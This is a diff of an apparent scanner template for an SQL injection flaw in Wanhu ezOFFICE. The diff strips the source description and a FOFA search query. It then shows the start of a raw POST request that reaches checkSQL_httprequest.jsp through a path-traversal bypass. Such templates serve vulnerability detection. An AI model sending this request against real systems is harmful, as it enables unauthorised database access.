@@ -3,12 +3,8 @@ info:
   name: 万户ezOFFICE checkSQL_httprequest.jsp存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/izmwcwggq50g9omn'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: izmwcwggq50g9omn
-    fofa: app="万户网络-ezOFFICE"
 http:
 - raw:
   - 'POST /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../modules/hrm/report/customize/checkSQL_httprequest.jsp HTTP/1.1
